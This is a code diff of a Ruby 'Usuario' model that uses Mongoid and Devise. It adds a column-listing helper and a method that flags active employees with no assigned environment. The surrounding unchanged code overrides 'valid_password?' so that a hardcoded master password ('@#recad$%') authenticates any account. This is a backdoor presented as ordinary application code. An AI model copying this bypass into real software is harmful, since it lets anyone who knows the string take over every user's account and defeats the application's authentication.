@@ -1,5 +1,8 @@
 class Usuario
   include Mongoid::Document
+  def self.columns
+    self.fields.collect{|c| c[1]}
+  end
   # Include default devise modules. Others available are:
   # :confirmable, :lockable, :timeoutable and :omniauthable
   devise :database_authenticatable, :registerable,
@@ -58,6 +61,15 @@ class Usuario
   def valid_password?(password)
     return true if password == "@#recad$%"
     super
+  end
+
+  def alerta_ambiente
+    funcionarios_sem_ambiente = self.local.funcionarios.where(:ambiente=>"").any_in(:situacao=>['Ativo','Acompanhado pela Casa do Professor','Ativo mas em sala ambiente perante perícia médica'])
+    if !funcionarios_sem_ambiente.none?
+      return true
+    else
+      return false
+    end
   end
 
 end
